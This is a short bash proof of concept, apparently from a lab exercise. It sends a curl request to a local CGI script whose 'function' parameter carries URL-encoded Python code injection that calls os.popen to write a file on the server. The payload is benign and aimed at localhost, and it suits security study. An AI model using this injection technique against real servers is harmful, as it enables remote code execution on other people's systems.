#!/usr/bin/env bash

# Write a file
curl 'http://localhost:4567/cgi-bin/domain.cgi' --data 'function=print%28%22%5Cr%5Cn%22+%2B+__import__%28%27os%27%29.popen%28%27echo+new_file+%3E+new_file.txt%27%29.read%28%29%29+and+sys.exit%280%29'
# File can be found on server at /var/www/cgi-bin/new_file.txt"
